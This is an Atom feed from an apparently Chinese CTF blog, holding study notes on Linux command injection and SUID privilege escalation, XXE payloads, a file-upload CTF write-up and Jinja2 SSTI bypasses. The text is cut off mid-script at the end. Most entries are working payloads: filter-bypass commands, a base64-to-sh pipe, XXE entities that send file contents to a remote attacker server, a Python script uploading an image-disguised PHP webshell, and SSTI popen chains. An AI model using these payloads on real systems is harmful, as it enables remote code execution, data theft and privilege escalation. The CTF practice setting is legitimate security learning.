<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>hatchet的个人博客</title>
  
  
  <link href="https://blog.hatchet.top/atom.xml" rel="self"/>
  
  <link href="https://blog.hatchet.top/"/>
  <updated>2024-09-18T16:24:00.000Z</updated>
  <id>https://blog.hatchet.top/</id>
  
  <author>
    <name>hatchet</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>linux命令执行</title>
    <link href="https://blog.hatchet.top/posts/5eef1d19.html"/>
    <id>https://blog.hatchet.top/posts/5eef1d19.html</id>
    <published>2024-09-18T16:24:00.000Z</published>
    <updated>2024-09-18T16:24:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="常见命令执行命令"><a href="#常见命令执行命令" class="headerlink" title="常见命令执行命令"></a>常见命令执行命令</h2><pre><code>systemexecpassthrushell_exec</code></pre><p>后三个命令无回显，需要保存到文件<br>cmd&#x3D;ls &#x2F;|tee 1.txt<br>访问 <a href="http://url/1.txt">http://url/1.txt</a></p><h2 id="部分-SUID-命令提权"><a href="#部分-SUID-命令提权" class="headerlink" title="部分 SUID 命令提权"></a>部分 SUID 命令提权</h2><p>寻找所有权限带 s 的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br><span class="line"></span><br><span class="line">-user 指定文件拥有者</span><br><span class="line">-perm 文件权限</span><br><span class="line">-<span class="built_in">exec</span> 执行系统命令</span><br></pre></td></tr></table></figure><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><pre><code>find /etc/passwd -exec &quot;whoami&quot; \;</code></pre><h3 id="date-读取文件"><a href="#date-读取文件" class="headerlink" title="date 读取文件"></a>date 读取文件</h3><pre><code>date -f/--file &lt;filename&gt;</code></pre><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><pre><code>awk &#39;BEGIN &#123;system(&quot;whoami&quot;)&#125;&#39;</code></pre><h3 id="sed-读取文件"><a href="#sed-读取文件" class="headerlink" title="sed 读取文件"></a>sed 读取文件</h3><pre><code>sed -n &#39;1p&#39; /flag</code></pre><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><pre><code>vim /etc/sudoers添加你的账户sudo bash</code></pre><h3 id="file-读取文件"><a href="#file-读取文件" class="headerlink" title="file 读取文件"></a>file 读取文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file -f /flag</span><br></pre></td></tr></table></figure><h2 id="linux-管道符"><a href="#linux-管道符" class="headerlink" title="linux 管道符"></a>linux 管道符</h2><pre><code>; 前面执行完成后再执行后面的语句| 直接执行后面的执行语句|| 只有前面执行出错时才执行后面的执行语句&amp; 无论前面真假都执行后面的语句&amp;&amp; 只有前面为真才执行后面的语句换行符%0a、%0d、\n</code></pre><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><pre><code>flag 被过滤cat /flagcat /fla\gcat /fla&quot;&quot;gcat /fla&#39;&#39;gcat /fl??cat /f\*cat /[e-h][k-m][9-b][e-h]cat /fl$1agcat /fl$2agcat /fl$@ag/???/?at /flaga=g;cat /fla$a</code></pre><h3 id="cat-类似命令"><a href="#cat-类似命令" class="headerlink" title="cat 类似命令"></a>cat 类似命令</h3><pre><code>more、less、head、tail、sort、tac、nl</code></pre><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><pre><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$1、$IFS$9、$&#123;IFS&#125;、$IFS</code></pre><h3 id="payload-经过-base64-绕过"><a href="#payload-经过-base64-绕过" class="headerlink" title="payload 经过 base64 绕过"></a>payload 经过 base64 绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2F0IC9mbGFn|<span class="built_in">base64</span> -d|sh</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure><h1 id="重要文件"><a href="#重要文件" class="headerlink" title="重要文件"></a>重要文件</h1><pre><code>/proc/self/environ/etc/hosts/etc/passwd/var/log/nginx/access.log/var/log/apache2/access.log/proc/self/fd/3/proc/self/cmdline</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h1&gt;&lt;h2 id=&quot;常见命令执行命令&quot;&gt;&lt;a href=&quot;#常见命令执行命令&quot; class=&quot;headerlink&quot; title=&quot;常</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://blog.hatchet.top/posts/e93ac459.html"/>
    <id>https://blog.hatchet.top/posts/e93ac459.html</id>
    <published>2024-09-18T15:47:42.000Z</published>
    <updated>2024-09-18T15:47:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE （PHP 5.45 之后不解析实体）</p><pre><code>&lt;!DOCTYPE 根标签名 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>DTD 实体是用于定义引用文本或字符的快捷方式的变量，可内部声明或外部引用。</p><p>约束通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><pre><code>&lt;!ELEMENT 标签名 ANY&gt;</code></pre><p>同时 xxe 可进行内网探测读取 &#x2F;etc&#x2F;hosts</p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="PHP-文件读取"><a href="#PHP-文件读取" class="headerlink" title="PHP 文件读取"></a>PHP 文件读取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="file-协议读取文件"><a href="#file-协议读取文件" class="headerlink" title="file 协议读取文件"></a>file 协议读取文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="SVG-格式"><a href="#SVG-格式" class="headerlink" title="SVG 格式"></a>SVG 格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h2 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h2><p>攻击服务器创建 shell.dtd：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1:5555/?flag=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="xxe-绕过的-payload"><a href="#xxe-绕过的-payload" class="headerlink" title="xxe 绕过的 payload"></a>xxe 绕过的 payload</h2><p>当只过滤了 SYSTEM，PUBLIC 等关键字时，可用双重实体编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;</span><br><span class="line"></span><br><span class="line">    %xml;</span><br></pre></td></tr></table></figure><p>即为在 xml 实体中再定义一次 xml，可成功被解析，支持 dtd 数据外带</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;core&gt;</span><br><span class="line">      &lt;message&gt;&amp;xxe;&lt;/message&gt;</span><br><span class="line">&lt;/core&gt;</span><br></pre></td></tr></table></figure><p>XXE 待复现<br>转自 <a href="https://wiki.wgpsec.org/knowledge/ctf/xxe.html">https://wiki.wgpsec.org/knowledge/ctf/xxe.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE&quot;&gt;&lt;a href=&quot;#XXE&quot; class=&quot;headerlink&quot; title=&quot;XXE&quot;&gt;&lt;/a&gt;XXE&lt;/h1&gt;&lt;p&gt;XXE （PHP 5.45 之后不解析实体）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE 根标签名 SYSTEM &amp;qu</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>[奇安信]Web-4-littledropbox</title>
    <link href="https://blog.hatchet.top/posts/89707270.html"/>
    <id>https://blog.hatchet.top/posts/89707270.html</id>
    <published>2024-09-18T15:31:42.000Z</published>
    <updated>2024-09-18T15:31:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="little-dropbox"><a href="#little-dropbox" class="headerlink" title="little dropbox"></a>little dropbox</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>))) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]), <span class="string">&#x27;&lt;?&#x27;</span>) !== False) <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$info</span>[<span class="number">0</span>] !== <span class="number">100</span> || <span class="variable">$info</span>[<span class="number">1</span>] !== <span class="number">50</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$uploadDir</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ready</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;ready&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_GET, <span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ready</span> === <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>] = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;secretKey&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[0]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">225</span>; <span class="variable">$i</span>++) <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[226]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[227]</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>() . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//[228]</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span> === (<span class="keyword">string</span>)<span class="variable">$_SESSION</span>[<span class="string">&#x27;secretKey&#x27;</span>]) &#123;</span><br><span class="line">        <span class="title function_ invoke__">upload</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="构造伪随机数"><a href="#构造伪随机数" class="headerlink" title="构造伪随机数"></a>构造伪随机数</h2><p>一开始需要构造 key 才能上传题目,开始时考虑使用专门进行种子爆破的 php_mt_seed 工具<br>后来百度发现无需暴力破解就可以计算原始种子<br><a href="https://wiki.wgpsec.org/knowledge/ctf/PRF.html">https://wiki.wgpsec.org/knowledge/ctf/PRF.html</a><br>前提要求是给定间隔 227 个值的两个 mt_rand()输出结果，例如第 1 个和第 228 个 mt_rand()的输出结果<br>下载 mt_rand-reverse-master<br><a href="https://github.com/ambionics/mt_rand-reverse">https://github.com/ambionics/mt_rand-reverse</a><br>传参 127.0.0.1:100&#x2F;upload.php?ready&#x3D;1</p><pre><code>412630690&lt;br&gt;1046894031&lt;br&gt;1961239210&lt;br&gt;2006731948&lt;br&gt;Cookie:PHPSESSID=o065m8ssj0dakiv4iijtsp8sq6</code></pre><p>传第 0 个和第 227 个 mt_rand()值</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python reverse_mt_rand.py <span class="number">412630690</span> <span class="number">1961239210</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>得到 key 值 1955787332</p><h2 id="构造绕过-PHP-文件上传"><a href="#构造绕过-PHP-文件上传" class="headerlink" title="构造绕过 PHP 文件上传"></a>构造绕过 PHP 文件上传</h2><p>使用文件名加点绕过,linux 在处理文件时会自动省略点号<br>内容用 js 语言&lt;script language&#x3D;”php”&gt;绕过<br>内容大小要求 100*50，使用 python 库 PIL 自动生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标上传的 URL</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/upload.php/?ready=1&amp;key=1955787332&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;o065m8ssj0dakiv4iijtsp8sq6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造图片（100x50），并在图片数据中嵌入恶意 PHP 代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image_with_payload</span>():</span><br><span class="line">    <span class="comment"># 创建一个 100x50 的空白图片</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">100</span>, <span class="number">50</span>), color=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    img_byte_arr = BytesIO()</span><br><span class="line">    img.save(img_byte_arr, <span class="built_in">format</span>=<span class="string">&quot;PNG&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PHP payload，嵌入到文件末尾</span></span><br><span class="line">    payload = <span class="string">b&quot;&lt;script language=\&quot;php\&quot;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将图片数据和 payload 结合起来</span></span><br><span class="line">    img_data = img_byte_arr.getvalue() + payload</span><br><span class="line">    <span class="keyword">return</span> img_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造上传请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="comment"># 生成带有 payload 的图片</span></span><br><span class="line">    img_data = create_image_with_payload()</span><br><span class="line">    filename = <span class="string">&quot;shell.php.&quot;</span></span><br><span class="line">    <span class="comment"># 构造文件参数</span></span><br><span class="line">    files = &#123;<span class="string">&quot;file&quot;</span>: (filename, img_data, <span class="string">&quot;image/png&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 POST 请求，上传文件</span></span><br><span class="line">    response = requests.post(url, files=files, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出上传结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response status:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response body:&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload_file()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后访问 127.0.0.1:100&#x2F;uploads&#x2F;shell.php 用蚁剑连接，密码为 cmd。</p>]]></content>
    
    
    <summary type="html">一道PHP文件上传+伪随机数绕过题</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="PHP" scheme="https://blog.hatchet.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>各种ssti绕过及脚本</title>
    <link href="https://blog.hatchet.top/posts/301c82e9.html"/>
    <id>https://blog.hatchet.top/posts/301c82e9.html</id>
    <published>2024-08-29T13:44:29.000Z</published>
    <updated>2024-08-29T13:44:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="判断网站类型"><a href="#判断网站类型" class="headerlink" title="判断网站类型"></a>判断网站类型</h1><h2 id="自己查找判断"><a href="#自己查找判断" class="headerlink" title="自己查找判断"></a>自己查找判断</h2><p>在页面或者抓包回复里有时会泄露类型</p><h2 id="在疑似-ssti-处注入-7-7"><a href="#在疑似-ssti-处注入-7-7" class="headerlink" title="在疑似 ssti 处注入 ${7*7}"></a>在疑似 ssti 处注入 ${7*7}</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><h4 id="a-comment-b"><a href="#a-comment-b" class="headerlink" title="a{*comment*}b"></a>a{*comment*}b</h4><p>-ab smarty</p><h4 id="“z”-join-“ab”-z"><a href="#“z”-join-“ab”-z" class="headerlink" title="${“z”.join(“ab”)}z"></a>${“z”.join(“ab”)}z</h4><p>-zab mako</p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="7-‘7’"><a href="#7-‘7’" class="headerlink" title="{{7*‘7’}}"></a>{{7*‘7’}}</h4><p>49 -Twig,smarty<br>7777777 -Jinja2 &#x2F;&#x2F;最常见的 ssti 类型</p><h1 id="各种类型"><a href="#各种类型" class="headerlink" title="各种类型"></a>各种类型</h1><h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><h3 id="常规信息搜集"><a href="#常规信息搜集" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h3><p>{{config}}<br>{{self.__dict__}}<br>{{url_for.__globals__}}<br>-&gt; {{url_for.__globals__[‘current_app’].config[‘FLAG’]}}<br>{{datetime}}<br>{{.Password}}</p><pre><code>{{a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)}}</code></pre><p>一个特解，不一定有效，如果有效就不用继续后面的了</p><h3 id="寻找危险类"><a href="#寻找危险类" class="headerlink" title="寻找危险类"></a>寻找危险类</h3><p>开头常见的有’’,””#&lt;class ‘str’&gt;, ()#&lt;class ‘tuple’&gt;。这里以’’为例，没有大的区别<br>{{‘’.__class__.__bases__}} 在这里找到 object 类<br>{{‘’.__class__.__bases__[0]}} &#x2F;&#x2F; &lt;class ‘object’&gt;<br>或是{{‘’.__class__.__mro__[2]}}&#x2F;&#x2F; &lt;class ‘object’&gt;<br>{{‘’.__class__.__bases__[0].__subclasses__()[?]}}<br>在？里填数字可以得到 对应的类，我们需要寻找危险类，它们能执行危险函数。<br>这里例如 os._wrap_close<br>跑脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:20440/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[<span class="subst">&#123;i&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">    <span class="comment"># GET</span></span><br><span class="line">    res = requests.get(url=url + <span class="string">f&quot;?name=<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    <span class="comment"># data = &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;flag&quot;: payload,</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># res = requests.post(url, data=data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>拿到危险类后就可以随意构造了<br>这里跑出来值为 127</p><pre><code>{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)}}</code></pre><h3 id="一点关于-ssti-的绕过"><a href="#一点关于-ssti-的绕过" class="headerlink" title="一点关于 ssti 的绕过"></a>一点关于 ssti 的绕过</h3><h4 id="request-绕过-没被过滤全部可绕"><a href="#request-绕过-没被过滤全部可绕" class="headerlink" title="request 绕过(没被过滤全部可绕)"></a>request 绕过(没被过滤全部可绕)</h4><p>可以直接帮你绕过引号内的内容</p><pre><code>{{config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()}}&amp;os=os&amp;command=cat /flag</code></pre><h4 id="chr-绕过-没被过滤全部可绕"><a href="#chr-绕过-没被过滤全部可绕" class="headerlink" title="chr 绕过(没被过滤全部可绕)"></a>chr 绕过(没被过滤全部可绕)</h4><p>先找到 chr 所需的危险类</p><pre><code>{%set chr = x.__init__.__globals__[&#39;__builtins__&#39;].chr%}{{&quot;&quot;chr(46)+chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95)+chr(46)+chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95)}}</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&#x27;__class__.__bases__&#x27;</span>;</span><br><span class="line">    <span class="variable">$ans</span>=<span class="string">&#x27;chr(&#x27;</span>.<span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="number">0</span>]).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span 